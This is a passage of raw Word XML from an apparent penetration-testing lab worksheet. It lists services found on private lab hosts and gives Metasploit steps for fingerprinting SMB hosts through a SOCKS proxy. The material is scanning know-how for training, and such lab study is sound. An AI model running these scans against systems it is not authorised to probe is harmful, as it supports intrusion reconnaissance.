          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00601D3F">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve">ssh </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="10420"/>
        </w:tabs>
        <w:spacing w:before="37" w:line="240" w:lineRule="exact"/>
        <w:ind w:left="252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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>172.31</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1.1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00601D3F">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>ftp,ssh,telnet,smtp,http,rpcbind(its linux),netbios-ssn,microsoft-ds(running samba)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="10420"/>
        </w:tabs>
        <w:spacing w:before="37" w:line="240" w:lineRule="exact"/>
        <w:ind w:left="252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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>172.31</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">1.12: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00601D3F">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>ftp,smtp,http,msrpc(its microsoft machine),netbios-ssn(file print service),microsoft-ds</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="10420"/>
        </w:tabs>
        <w:spacing w:before="37" w:line="240" w:lineRule="exact"/>
        <w:ind w:left="252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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>172.31</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">1.14: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00601D3F">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>msrpc,netbios-ssn,microsoft-ds,ms-wbt-server(rdp)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1440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6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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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U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e Metas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>p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loit SMB Scan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>n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er</w:t>
      </w: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 xml:space="preserve">to </w:t>
      </w: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F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ing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r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>p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 xml:space="preserve">rint </w:t>
      </w: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t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he</w:t>
      </w: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Ho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ts</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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Open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et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sp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oit F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me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wo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k:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>msfconsole</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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ch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or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nd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lo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e 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er:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>search scanner smb</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>use auxiliary/scanner/smb/smb_version</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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et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me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ers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nd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un (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ne line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h):</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>set RHOSTS 172.31.1.10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>14</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="413" w:lineRule="auto"/>
        <w:ind w:left="2520" w:right="5326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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>set Proxies socks5:127.0.0.1:1080 show options</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>run</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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ec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syst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m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nge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ints:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="9100"/>
        </w:tabs>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:ind w:left="252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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>172.31</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1.1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0051062B">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>linux machine just running ssh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="9100"/>
        </w:tabs>
        <w:spacing w:before="37" w:line="240" w:lineRule="exact"/>
        <w:ind w:left="252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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>172.31</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">1.11: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0051062B">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>linux.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="9100"/>
        </w:tabs>
        <w:spacing w:before="37" w:line="240" w:lineRule="exact"/>
        <w:ind w:left="252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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>172.31</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">1.12: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0051062B">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>windows xp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="9100"/>
        </w:tabs>
        <w:spacing w:before="37"/>
        <w:ind w:left="2520"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="765" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>172.31</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">1.14: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
